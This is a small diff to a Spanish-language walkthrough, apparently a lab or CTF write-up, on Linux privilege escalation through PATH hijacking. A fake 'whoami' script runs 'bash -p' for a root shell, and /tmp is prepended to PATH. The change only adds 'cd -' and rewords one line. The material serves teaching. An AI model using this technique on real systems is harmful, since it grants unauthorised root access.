@@ -83,8 +83,9 @@ chmod 755 whoami
 echo "bash -p" > whoami
 ```
 De esa forma nos devolverá una shell con privilegios de root. <br>
-Ahora se modificará el PATH: <br>
+Ahora volvemos a la ruta del binario, y se modificará el PATH: <br>
 ```
+cd -
 export PATH=/tmp:$PATH
 ```
 El comienzo del path, se debería ver de la siguiente forma usando echo $PATH
